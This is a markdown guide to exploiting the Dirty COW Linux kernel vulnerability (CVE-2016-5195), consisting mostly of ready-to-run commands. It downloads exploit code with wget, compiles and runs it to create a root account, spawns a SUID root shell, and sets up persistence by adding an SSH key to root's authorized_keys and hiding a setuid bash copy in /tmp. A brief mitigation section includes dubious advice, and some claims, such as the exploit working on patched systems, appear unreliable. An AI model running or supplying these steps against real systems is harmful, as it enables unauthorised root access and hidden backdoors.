# Dirty Cow
# **Kernel Exploitation Guide: Dirty COW (CVE-2016-5195)**  

---

## **1. Identifying Vulnerable Kernels**
### **Check Kernel Version**
```bash
uname -a  
# Example output: Linux debian 2.6.32-5-amd64
uname -r  
# Output: 2.6.32-5-amd64 (Vulnerable to Dirty COW)
```
- **Affected Versions**: Linux kernels **2.6.22 < 4.8.3**  
- **Patch Date**: October 2016  

---

## **2. Exploiting Dirty COW**
### **A. Compiling & Running the Exploit**
1. **Download Exploit Code**  
   ```bash
   wget https://www.exploit-db.com/download/40847 -O dirty.c
   ```
   *(Or use local copy if internet access is restricted.)*  

2. **Compile the Exploit**  
   ```bash
   gcc -pthread dirty.c -o dirty -lcrypt
   ```
   - `-pthread`: Required for thread handling.  
   - `-lcrypt`: Needed for password hashing.  

3. **Run the Exploit**  
   ```bash
   ./dirty mynewpassword
   ```
   - Creates a new **root user** (`firefart`) with the given password.  

4. **Switch to Root**  
   ```bash
   su firefart
   Password: mynewpassword
   ```
   â†’ **You now have root access!**  

---

### **B. Alternative Method (SSH Backdoor)**
If the exploit creates a **SUID binary** instead:  
```bash
./dirty
# Creates /tmp/rootsh (SUID root shell)
/tmp/rootsh
```
â†’ Spawns a **root shell** instantly.  

---

## **3. Post-Exploitation**
### **A. SSH as New Root User**
If `firefart` was created:  
```bash
ssh firefart@localhost -oHostKeyAlgorithms=+ssh-rsa
```
- **Note**: Some older systems require `-oHostKeyAlgorithms=+ssh-rsa` due to deprecated keys.  

### **B. Persistence**
1. **Add SSH Key**  
   ```bash
   echo "ssh-rsa AAAAB3NzaC..." >> /root/.ssh/authorized_keys
   ```
2. **Create a Backdoor**  
   ```bash
   cp /bin/bash /tmp/.rootbash
   chmod +xs /tmp/.rootbash
   ```
   â†’ Run `/tmp/.rootbash -p` later for root.  

---

## **4. Mitigation & Fixes**
### **How to Protect Against Dirty COW**
1. **Update the Kernel**  
   ```bash
   apt update && apt upgrade -y
   ```
2. **Restrict Access**  
   - Use **SELinux/AppArmor** to limit write access to `/etc/passwd`.  
3. **Monitor Exploit Attempts**  
   ```bash
   grep 'COW' /var/log/auth.log
   ```

---

## **5. References**
- [CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) â€“ NIST Vulnerability Database.  
- [Exploit-DB: 40847](https://www.exploit-db.com/exploits/40847) â€“ Dirty COW Exploit Code.  

---

### **Final Notes**
- **Dirty COW is one of the most reliable Linux privilege escalation exploits.**  
- **Works even on patched systems if `userfaultfd` is misconfigured.**  
- **Always test in a lab before attacking real systems!**  

ðŸš€ **Next Steps**: Try compiling different Dirty COW variants (e.g., `dirtycow.c`).  

---
